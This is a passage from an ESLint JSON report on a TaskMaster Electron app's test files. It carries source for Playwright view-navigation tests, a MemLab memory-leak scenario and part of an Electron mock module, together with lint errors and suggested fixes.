button\n    const toggleSelectors = [\n      '[data-testid=\"sidebar-toggle\"]',\n      '.sidebar-toggle',\n      'button[aria-label*=\"sidebar\"]',\n      'button[aria-label*=\"menu\"]'\n    ];\n\n    for (const selector of toggleSelectors) {\n      const toggle = this.page.locator(selector).first();\n      if (await toggle.isVisible().catch(() => false)) {\n        await toggle.click();\n        await this.page.waitForTimeout(300); // Allow animation\n        console.log('âœ… Sidebar toggled');\n        return;\n      }\n    }\n\n    console.warn('âš ï¸ Sidebar toggle button not found');\n  }\n\n  /**\n   * Verify sidebar collapse state\n   */\n  async isSidebarCollapsed(): Promise<boolean> {\n    const sidebar = this.sidebar;\n    if (await sidebar.isVisible()) {\n      // Check for collapsed indicators\n      const isCollapsed = await this.page.evaluate(() => {\n        const sidebar = document.querySelector('[data-testid=\"sidebar\"], aside, .sidebar');\n        if (!sidebar) return false;\n        \n        return sidebar.classList.contains('collapsed') ||\n               sidebar.getAttribute('data-collapsed') === 'true' ||\n               sidebar.getAttribute('aria-expanded') === 'false';\n      });\n      \n      return isCollapsed;\n    }\n    return true; // If sidebar is not visible, consider it collapsed\n  }\n\n  /**\n   * Check if animations are enabled\n   */\n  async areAnimationsEnabled(): Promise<boolean> {\n    return await this.page.evaluate(() => {\n      // Check for reduced motion preference\n      const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;\n      \n      // Check for animation settings in app\n      const appSettings = (window as any).__APP_SETTINGS__;\n      if (appSettings && appSettings.animations !== undefined) {\n        return appSettings.animations && !prefersReducedMotion;\n      }\n      \n      // Default to checking CSS animations\n      const testElement = document.createElement('div');\n      testElement.style.animation = 'test 1s';\n      return testElement.style.animation !== '' && !prefersReducedMotion;\n    });\n  }\n\n  /**\n   * Measure view transition performance\n   */\n  async measureViewTransitionPerformance(fromView: string, toView: string): Promise<{\n    transitionTime: number;\n    renderTime: number;\n    layoutTime: number;\n  }> {\n    const startTime = performance.now();\n    \n    // Navigate to the target view\n    await this.navigateToViewBySidebar(toView as any);\n    \n    const endTime = performance.now();\n    const transitionTime = endTime - startTime;\n    \n    // Measure rendering metrics\n    const metrics = await this.page.evaluate(() => {\n      const renderTime = performance.now();\n      \n      // Force a layout calculation\n      document.body.offsetHeight;\n      const layoutTime = performance.now();\n      \n      return {\n        renderTime: renderTime - performance.timing.navigationStart,\n        layoutTime: layoutTime - renderTime\n      };\n    });\n    \n    return {\n      transitionTime,\n      renderTime: metrics.renderTime,\n      layoutTime: metrics.layoutTime\n    };\n  }\n}\n\n/**\n * Test Suite: View Switching and Navigation\n */\ntest.describe('View Switching and Navigation', () => {\n  let electronApp: ElectronApplication;\n  let page: Page;\n  let navPage: ViewNavigationPage;\n\n  test.beforeEach(async () => {\n    console.log('ðŸš€ Starting TaskMaster for view navigation testing...');\n    \n    electronApp = await launchElectronForE2E({\n      env: {\n        NODE_ENV: 'test',\n        ELECTRON_IS_DEV: '0',\n        PLAYWRIGHT_TEST: '1'\n      }\n    });\n\n    page = await getMainWindow();\n    navPage = new ViewNavigationPage(page);\n    \n    // Wait for app to be fully loaded\n    await navPage.waitForViewTransition();\n    \n    console.log('âœ… View navigation testing environment ready');\n  });\n\n  test.afterEach(async () => {\n    await takeE2EScreenshot('view-navigation-cleanup');\n    await closeElectronE2E();\n  });\n\n  /**\n   * Test: Basic View Switching via Sidebar\n   */\n  test('should switch between all views using sidebar navigation', async () => {\n    const views: Array<'analytics' | 'list' | 'calendar' | 'kanban' | 'timeline' | 'claude-config'> = [\n      'analytics', 'list', 'calendar', 'kanban', 'timeline', 'claude-config'\n    ];\n\n    for (const view of views) {\n      console.log(`ðŸ”„ Testing navigation to ${view} view...`);\n      \n      // Navigate to the view\n      await navPage.navigateToViewBySidebar(view);\n      \n      // Verify the view is active\n      const isActive = await navPage.verifyActiveViewIndicators(view);\n      expect(isActive).toBeTruthy();\n      \n      // Verify current view matches expectation\n      const currentView = await navPage.getCurrentView();\n      expect(currentView).toBe(view);\n      \n      // Take screenshot for visual verification\n      await takeE2EScreenshot(`view-${view}-active`);\n      \n      console.log(`âœ… Successfully verified ${view} view`);\n    }\n  });\n\n  /**\n   * Test: Keyboard Shortcut Navigation\n   */\n  test('should navigate using keyboard shortcuts (âŒ˜1-6)', async () => {\n    const shortcuts: Array<{\n      view: 'analytics' | 'list' | 'calendar' | 'kanban' | 'timeline' | 'claude-config';\n      key: string;\n    }> = [\n      { view: 'analytics', key: 'âŒ˜1' },\n      { view: 'list', key: 'âŒ˜2' },\n      { view: 'calendar', key: 'âŒ˜3' },\n      { view: 'kanban', key: 'âŒ˜4' },\n      { view: 'timeline', key: 'âŒ˜5' },\n      { view: 'claude-config', key: 'âŒ˜6' }\n    ];\n\n    for (const { view, key } of shortcuts) {\n      console.log(`âŒ¨ï¸ Testing ${key} shortcut for ${view} view...`);\n      \n      // Use keyboard shortcut\n      await navPage.navigateToViewByKeyboard(view);\n      \n      // Verify the view is active\n      const isActive = await navPage.verifyActiveViewIndicators(view);\n      expect(isActive).toBeTruthy();\n      \n      // Verify current view\n      const currentView = await navPage.getCurrentView();\n      expect(currentView).toBe(view);\n      \n      console.log(`âœ… Keyboard shortcut ${key} works for ${view} view`);\n    }\n\n    await takeE2EScreenshot('keyboard-navigation-complete');\n  });\n\n  /**\n   * Test: View Transition Animations\n   */\n  test('should show smooth transitions between views', async () => {\n    // Check if animations are enabled\n    const animationsEnabled = await navPage.areAnimationsEnabled();\n    console.log(`ðŸŽ¬ Animations enabled: ${animationsEnabled}`);\n\n    // Test transitions between different view types\n    const transitionTests = [\n      { from: 'list', to: 'kanban' },\n      { from: 'kanban', to: 'calendar' },\n      { from: 'calendar', to: 'analytics' },\n      { from: 'analytics', to: 'timeline' }\n    ];\n\n    for (const { from, to } of transitionTests) {\n      console.log(`ðŸ”„ Testing transition from ${from} to ${to}...`);\n      \n      // Navigate to starting view\n      await navPage.navigateToViewBySidebar(from as any);\n      await takeE2EScreenshot(`transition-${from}-start`);\n      \n      // Measure transition performance\n      const metrics = await navPage.measureViewTransitionPerformance(from, to);\n      \n      // Verify transition completed successfully\n      const currentView = await navPage.getCurrentView();\n      expect(currentView).toBe(to);\n      \n      // Verify transition was reasonably fast (under 2 seconds)\n      expect(metrics.transitionTime).toBeLessThan(2000);\n      \n      await takeE2EScreenshot(`transition-${to}-end`);\n      \n      console.log(`âœ… Transition ${from} â†’ ${to}: ${metrics.transitionTime.toFixed(2)}ms`);\n    }\n  });\n\n  /**\n   * Test: State Preservation During Navigation\n   */\n  test('should preserve application state during view switches', async () => {\n    // Start in list view and set up some state\n    await navPage.navigateToViewBySidebar('list');\n    \n    // Add some search state\n    const searchInput = navPage.searchInput;\n    if (await searchInput.isVisible().catch(() => false)) {\n      await searchInput.fill('test search');\n      await page.waitForTimeout(500);\n    }\n\n    // Switch to different views and back\n    await navPage.navigateToViewBySidebar('analytics');\n    await navPage.navigateToViewBySidebar('kanban');\n    await navPage.navigateToViewBySidebar('list');\n\n    // Verify search state is preserved\n    if (await searchInput.isVisible().catch(() => false)) {\n      const searchValue = await searchInput.inputValue();\n      expect(searchValue).toBe('test search');\n      console.log('âœ… Search state preserved during navigation');\n    }\n\n    await takeE2EScreenshot('state-preservation-test');\n  });\n\n  /**\n   * Test: Sidebar Collapse/Expand Functionality\n   */\n  test('should handle sidebar collapse and expand correctly', async () => {\n    // Check initial sidebar state\n    const initiallyCollapsed = await navPage.isSidebarCollapsed();\n    console.log(`ðŸ“± Initial sidebar state: ${initiallyCollapsed ? 'collapsed' : 'expanded'}`);\n\n    // Toggle sidebar\n    await navPage.toggleSidebar();\n    \n    // Verify state changed\n    const afterToggle = await navPage.isSidebarCollapsed();\n    expect(afterToggle).toBe(!initiallyCollapsed);\n    \n    await takeE2EScreenshot('sidebar-toggled');\n\n    // Test navigation with collapsed sidebar\n    if (afterToggle) {\n      // Try keyboard navigation with collapsed sidebar\n      await navPage.navigateToViewByKeyboard('kanban');\n      const currentView = await navPage.getCurrentView();\n      expect(currentView).toBe('kanban');\n      console.log('âœ… Navigation works with collapsed sidebar');\n    }\n\n    // Expand sidebar again\n    await navPage.toggleSidebar();\n    const finalState = await navPage.isSidebarCollapsed();\n    expect(finalState).toBe(initiallyCollapsed);\n\n    await takeE2EScreenshot('sidebar-restored');\n  });\n\n  /**\n   * Test: Navigation Performance Benchmarks\n   */\n  test('should meet performance benchmarks for view switching', async () => {\n    const performanceResults: Array<{\n      transition: string;\n      time: number;\n    }> = [];\n\n    // Test all view transitions for performance\n    const views: Array<'analytics' | 'list' | 'calendar' | 'kanban' | 'timeline'> = [\n      'analytics', 'list', 'calendar', 'kanban', 'timeline'\n    ];\n\n    for (let i = 0; i < views.length; i++) {\n      const currentView = views[i];\n      const nextView = views[(i + 1) % views.length];\n      \n      const startTime = performance.now();\n      await navPage.navigateToViewBySidebar(nextView);\n      const endTime = performance.now();\n      \n      const transitionTime = endTime - startTime;\n      performanceResults.push({\n        transition: `${currentView} â†’ ${nextView}`,\n        time: transitionTime\n      });\n\n      // Each transition should be under 1 second\n      expect(transitionTime).toBeLessThan(1000);\n    }\n\n    // Calculate average transition time\n    const averageTime = performanceResults.reduce((sum, result) => sum + result.time, 0) / performanceResults.length;\n    \n    console.log('ðŸ“Š Performance Results:');\n    performanceResults.forEach(result => {\n      console.log(`  ${result.transition}: ${result.time.toFixed(2)}ms`);\n    });\n    console.log(`  Average: ${averageTime.toFixed(2)}ms`);\n\n    // Average should be under 500ms\n    expect(averageTime).toBeLessThan(500);\n\n    await takeE2EScreenshot('performance-test-complete');\n  });\n\n  /**\n   * Test: Accessibility Compliance for Navigation\n   */\n  test('should meet accessibility standards for navigation', async () => {\n    // Test keyboard navigation accessibility\n    await page.keyboard.press('Tab'); // Should focus first navigation element\n    \n    // Verify focus indicators\n    const focusedElement = await page.locator(':focus').first();\n    const isFocusVisible = await focusedElement.isVisible();\n    expect(isFocusVisible).toBeTruthy();\n\n    // Test ARIA attributes\n    const navButtons = await page.locator('nav button, [role=\"navigation\"] button').all();\n    \n    for (const button of navButtons) {\n      const hasAccessibleName = await button.evaluate(el => {\n        return !!(el.getAttribute('aria-label') || \n                 el.getAttribute('aria-labelledby') || \n                 el.textContent?.trim());\n      });\n      expect(hasAccessibleName).toBeTruthy();\n    }\n\n    // Run general accessibility validation\n    await validateAccessibility(page);\n\n    // Test screen reader navigation\n    const navElement = page.locator('nav, [role=\"navigation\"]').first();\n    const hasNavRole = await navElement.evaluate(el => \n      el.getAttribute('role') === 'navigation' || el.tagName.toLowerCase() === 'nav'\n    );\n    expect(hasNavRole).toBeTruthy();\n\n    await takeE2EScreenshot('accessibility-test');\n    console.log('âœ… Navigation accessibility tests passed');\n  });\n\n  /**\n   * Test: Error Handling for Invalid View States\n   */\n  test('should handle invalid view states gracefully', async () => {\n    // Try to set an invalid view state via JavaScript\n    await page.evaluate(() => {\n      // Simulate corrupted state\n      const store = (window as any).__APP_STORE__;\n      if (store && store.setViewMode) {\n        store.setViewMode({ type: 'invalid-view' });\n      }\n    });\n\n    await page.waitForTimeout(1000);\n\n    // Should fallback to a default view\n    const currentView = await navPage.getCurrentView();\n    expect(currentView).toBeTruthy();\n    expect(['analytics', 'list', 'calendar', 'kanban', 'timeline', 'claude-config']).toContain(currentView);\n\n    console.log(`âœ… Gracefully handled invalid state, fell back to: ${currentView}`);\n    await takeE2EScreenshot('error-handling-test');\n  });\n\n  /**\n   * Test: Deep Linking and URL State Management\n   */\n  test('should handle view state through URL or app state', async () => {\n    // Test if the app maintains view state through some mechanism\n    const initialView = await navPage.getCurrentView();\n    \n    // Navigate through several views\n    await navPage.navigateToViewBySidebar('kanban');\n    await navPage.navigateToViewBySidebar('calendar');\n    await navPage.navigateToViewBySidebar('analytics');\n\n    // Check if there's any persistence mechanism\n    const currentState = await page.evaluate(() => {\n      return {\n        localStorage: localStorage.getItem('taskmaster-view-state'),\n        sessionStorage: sessionStorage.getItem('taskmaster-view-state'),\n        url: window.location.href,\n        history: window.history.length\n      };\n    });\n\n    console.log('ðŸ” State persistence check:', currentState);\n\n    // Verify current view is correct\n    const finalView = await navPage.getCurrentView();\n    expect(finalView).toBe('analytics');\n\n    await takeE2EScreenshot('state-management-test');\n  });\n\n  /**\n   * Test: Cross-Platform Navigation Consistency\n   */\n  test('should work consistently across platforms', async () => {\n    const platform = process.platform;\n    console.log(`ðŸ–¥ï¸ Testing on platform: ${platform}`);\n\n    // Test platform-specific keyboard shortcuts\n    const modifierKey = platform === 'darwin' ? 'Meta' : 'Control';\n    \n    // Test with platform-appropriate modifier\n    await page.keyboard.press(`${modifierKey}+2`);\n    await navPage.waitForViewTransition();\n    \n    const currentView = await navPage.getCurrentView();\n    expect(currentView).toBe('list');\n\n    // Test mouse navigation works regardless of platform\n    await navPage.navigateToViewBySidebar('kanban');\n    const afterMouseNav = await navPage.getCurrentView();\n    expect(afterMouseNav).toBe('kanban');\n\n    console.log(`âœ… Navigation works correctly on ${platform}`);\n    await takeE2EScreenshot(`platform-${platform}-navigation`);\n  });\n\n  /**\n   * Test: Memory Usage During Navigation\n   */\n  test('should not leak memory during frequent navigation', async () => {\n    const initialMetrics = await measureE2EPerformance();\n    \n    // Perform many view switches to test for memory leaks\n    const views: Array<'analytics' | 'list' | 'calendar' | 'kanban' | 'timeline'> = [\n      'analytics', 'list', 'calendar', 'kanban', 'timeline'\n    ];\n\n    for (let cycle = 0; cycle < 5; cycle++) {\n      for (const view of views) {\n        await navPage.navigateToViewBySidebar(view);\n        await page.waitForTimeout(100); // Brief pause\n      }\n    }\n\n    const finalMetrics = await measureE2EPerformance();\n    \n    // Memory should not have increased dramatically\n    if (initialMetrics.memoryUsage && finalMetrics.memoryUsage) {\n      const memoryIncrease = finalMetrics.memoryUsage.heapUsed - initialMetrics.memoryUsage.heapUsed;\n      const memoryIncreaseMB = memoryIncrease / 1024 / 1024;\n      \n      console.log(`ðŸ“Š Memory increase after navigation cycles: ${memoryIncreaseMB.toFixed(2)}MB`);\n      \n      // Should not increase by more than 50MB\n      expect(memoryIncreaseMB).toBeLessThan(50);\n    }\n\n    await takeE2EScreenshot('memory-test-complete');\n    console.log('âœ… Memory usage test passed');\n  });\n});","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/integration/app-lifecycle.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/integration/baseline.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/memlab-scenarios/extended-usage.memlab.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/memlab-scenarios/task-operations.memlab.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/memlab-scenarios/view-switching.memlab.ts","messages":[{"ruleId":"@typescript-eslint/no-unused-expressions","severity":2,"message":"Expected an assignment or function call and instead saw an expression.","line":95,"column":11,"nodeType":"ExpressionStatement","messageId":"unusedExpression","endLine":95,"endColumn":27},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":146,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":146,"endColumn":82,"suggestions":[{"messageId":"addBrackets","fix":{"range":[4821,5239],"text":"{ const firstCard = await page.$('[data-testid*=\"task-card\"]:first-child');\n        if (firstCard) {\n          const box = await firstCard.boundingBox();\n          if (box) {\n            await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);\n            await page.mouse.down();\n            await page.mouse.move(box.x + 200, box.y);\n            await page.mouse.up();\n          }\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":160,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":160,"endColumn":95,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5318,5718],"text":"{ const chartElements = await page.$$('[data-testid*=\"chart\"], .chart-container svg *');\n        for (let i = 0; i < Math.min(chartElements.length, 5); i++) {\n          const box = await chartElements[i].boundingBox();\n          if (box) {\n            await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);\n            await page.waitForTimeout(100);\n          }\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":172,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":172,"endColumn":92,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5795,6055],"text":"{ const dateElements = await page.$$('[data-testid*=\"calendar-day\"], .calendar-day');\n        for (let i = 0; i < Math.min(dateElements.length, 5); i++) {\n          await dateElements[i].click();\n          await page.waitForTimeout(100);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]}],"suppressedMessages":[],"errorCount":4,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * MemLab Scenario: View Switching Memory Leak Detection\n * \n * This scenario tests for memory leaks when rapidly switching between views:\n * - Component lifecycle management\n * - Event listener cleanup\n * - Animation cleanup\n * - State management\n */\n\nimport { Page } from 'puppeteer';\nimport { IScenario } from '@memlab/api';\n\nconst scenario: IScenario = {\n  setup: async (page: Page) => {\n    // Navigate to the application\n    await page.goto('http://localhost:3000', { waitUntil: 'networkidle2' });\n    \n    // Wait for initial load\n    await page.waitForSelector('[data-testid=\"main-content\"], main', { timeout: 10000 });\n    \n    // Inject some test data for better testing\n    await page.evaluate(() => {\n      // Create test tasks if needed\n      const testTasks = Array.from({ length: 100 }, (_, i) => ({\n        id: `view-test-${i}`,\n        title: `View Test Task ${i}`,\n        description: `Task for testing view switching memory leaks`,\n        priority: ['high', 'medium', 'low'][i % 3],\n        status: ['pending', 'in-progress', 'done'][i % 3],\n        createdAt: new Date().toISOString(),\n        updatedAt: new Date().toISOString()\n      }));\n      \n      // Store in window for testing\n      (window as any).__MEMLAB_TEST_TASKS__ = testTasks;\n    });\n  },\n  \n  action: async (page: Page) => {\n    const views = ['list', 'kanban', 'analytics', 'calendar', 'timeline'];\n    const iterations = 20; // Rapid switching\n    \n    // 1. Rapid view switching\n    for (let i = 0; i < iterations; i++) {\n      for (const view of views) {\n        // Click on view button\n        const viewSelector = `[data-testid=\"view-${view}\"], button:has-text(\"${view}\"), [aria-label=\"${view} view\"]`;\n        const viewButton = await page.$(viewSelector);\n        \n        if (viewButton) {\n          await viewButton.click();\n          \n          // Wait for view to render\n          await page.waitForSelector(`[data-view=\"${view}\"], [data-testid=\"${view}-view\"]`, { \n            timeout: 5000 \n          }).catch(() => {\n            // Fallback: just wait a bit\n            return page.waitForTimeout(500);\n          });\n          \n          // Interact with the view to trigger more potential leaks\n          await this.interactWithView(page, view);\n        }\n      }\n    }\n    \n    // 2. Open and close modals/dialogs\n    for (let i = 0; i < 10; i++) {\n      // Open task creation modal\n      const createButton = await page.$('[data-testid=\"create-task-button\"], button:has-text(\"Create\")');\n      if (createButton) {\n        await createButton.click();\n        await page.waitForSelector('[role=\"dialog\"]', { timeout: 2000 });\n        \n        // Close without saving\n        const closeButton = await page.$('[aria-label=\"Close\"], button:has-text(\"Cancel\")');\n        if (closeButton) {\n          await closeButton.click();\n        } else {\n          // Press Escape\n          await page.keyboard.press('Escape');\n        }\n        \n        await page.waitForSelector('[role=\"dialog\"]', { state: 'hidden', timeout: 2000 }).catch(() => {});\n      }\n    }\n    \n    // 3. Trigger animations and transitions\n    await page.evaluate(() => {\n      // Force all animations to run\n      document.querySelectorAll('*').forEach(el => {\n        if (el instanceof HTMLElement) {\n          el.style.animation = 'none';\n          el.offsetHeight; // Trigger reflow\n          el.style.animation = '';\n        }\n      });\n    });\n  },\n  \n  back: async (page: Page) => {\n    // Reset to initial view\n    const listViewButton = await page.$('[data-testid=\"view-list\"], button:has-text(\"list\")');\n    if (listViewButton) {\n      await listViewButton.click();\n      await page.waitForTimeout(1000);\n    }\n    \n    // Clear test data\n    await page.evaluate(() => {\n      delete (window as any).__MEMLAB_TEST_TASKS__;\n      \n      // Force cleanup of any remaining event listeners\n      const events = (window as any).__memlab_event_listeners;\n      if (events && Array.isArray(events)) {\n        events.forEach((listener: any) => {\n          if (listener.element && listener.event && listener.handler) {\n            listener.element.removeEventListener(listener.event, listener.handler);\n          }\n        });\n      }\n      \n      // Force garbage collection\n      if ((window as any).gc) {\n        (window as any).gc();\n      }\n    });\n  },\n  \n  // Helper method to interact with different views\n  interactWithView: async (page: Page, view: string) => {\n    switch (view) {\n      case 'list':\n        // Scroll the list\n        await page.evaluate(() => {\n          const list = document.querySelector('[data-testid=\"task-list\"], .task-list');\n          if (list) {\n            list.scrollTop = list.scrollHeight / 2;\n          }\n        });\n        break;\n        \n      case 'kanban':\n        // Simulate drag and drop\n        const firstCard = await page.$('[data-testid*=\"task-card\"]:first-child');\n        if (firstCard) {\n          const box = await firstCard.boundingBox();\n          if (box) {\n            await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);\n            await page.mouse.down();\n            await page.mouse.move(box.x + 200, box.y);\n            await page.mouse.up();\n          }\n        }\n        break;\n        \n      case 'analytics':\n        // Hover over chart elements\n        const chartElements = await page.$$('[data-testid*=\"chart\"], .chart-container svg *');\n        for (let i = 0; i < Math.min(chartElements.length, 5); i++) {\n          const box = await chartElements[i].boundingBox();\n          if (box) {\n            await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);\n            await page.waitForTimeout(100);\n          }\n        }\n        break;\n        \n      case 'calendar':\n        // Click on different dates\n        const dateElements = await page.$$('[data-testid*=\"calendar-day\"], .calendar-day');\n        for (let i = 0; i < Math.min(dateElements.length, 5); i++) {\n          await dateElements[i].click();\n          await page.waitForTimeout(100);\n        }\n        break;\n        \n      case 'timeline':\n        // Scroll timeline\n        await page.evaluate(() => {\n          const timeline = document.querySelector('[data-testid=\"timeline\"], .timeline-container');\n          if (timeline) {\n            timeline.scrollLeft = timeline.scrollWidth / 2;\n          }\n        });\n        break;\n    }\n  },\n  \n  // Define what constitutes a memory leak for view switching\n  leakFilter: (node: any, _snapshot: any, _leakedNodeIds: Set<number>) => {\n    // Check for detached React Fiber nodes\n    if (node.name && node.name.includes('FiberNode') && node.retainedSize > 5000) {\n      return true;\n    }\n    \n    // Check for detached DOM elements from previous views\n    if (node.name && node.name.includes('Detached') && node.name.includes('Element')) {\n      return true;\n    }\n    \n    // Check for animation/transition related leaks\n    if (node.name && (node.name.includes('Animation') || node.name.includes('Transition'))) {\n      return true;\n    }\n    \n    // Check for uncleaned event listeners\n    if (node.name && node.name.includes('EventListener')) {\n      return true;\n    }\n    \n    // Check for retained view state\n    if (node.name && node.name.includes('ViewState') && node.retainedSize > 10000) {\n      return true;\n    }\n    \n    return false;\n  }\n};\n\nexport default scenario;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/mocks/electron.mock.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/mocks/electron/index.ts","messages":[{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":120,"column":36,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":120,"endColumn":44},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":121,"column":41,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":121,"endColumn":49},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":124,"column":46,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":124,"endColumn":54},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":127,"column":50,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":127,"endColumn":58},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":133,"column":41,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":133,"endColumn":49},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":140,"column":43,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":140,"endColumn":51},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":151,"column":42,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":151,"endColumn":50},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":155,"column":53,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":155,"endColumn":61},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":187,"column":37,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":187,"endColumn":45},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":188,"column":42,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":188,"endColumn":50},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":194,"column":41,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":194,"endColumn":49},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":203,"column":43,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":203,"endColumn":51},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":210,"column":45,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":210,"endColumn":53},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":221,"column":44,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":221,"endColumn":52},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":225,"column":55,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":225,"endColumn":63},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":328,"column":41,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":328,"endColumn":49},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":335,"column":41,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":335,"endColumn":49},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":342,"column":43,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":342,"endColumn":51},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":353,"column":42,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":353,"endColumn":50},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":357,"column":53,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":357,"endColumn":61},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":519,"column":46,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":519,"endColumn":54}],"suppressedMessages":[],"errorCount":21,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Comprehensive Electron Mock Utilities (2025)\n * \n * Type-safe, reusable mock implementations for Electron APIs\n * following 2025 testing best practices.\n */\n\nimport { vi } from 'vitest';\nimport type { \n  BrowserWindow, \n  IpcMain, \n  IpcRenderer, \n  App, \n  Dialog,\n  Shell,\n  Menu,\n  MenuItem,\n  WebContents,\n  Session,\n  Protocol,\n  AutoUpdater,\n  CancellationToken\n} from 'electron';\n\n// Mock Event Implementation\nexport class MockEvent {\n  defaultPrevented = false;\n  sender: any;\n  returnValue: any;\n  frameId?: number;\n  processId?: number;\n  \n  constructor(sender?: any) {\n    this.sender = sender || createMockWebContents();\n  }\n  \n  preventDefault() {\n    this.defaultPrevented = true;\n  }\n}\n\n// Mock WebContents\nexport function createMockWebContents(overrides: Partial<WebContents> = 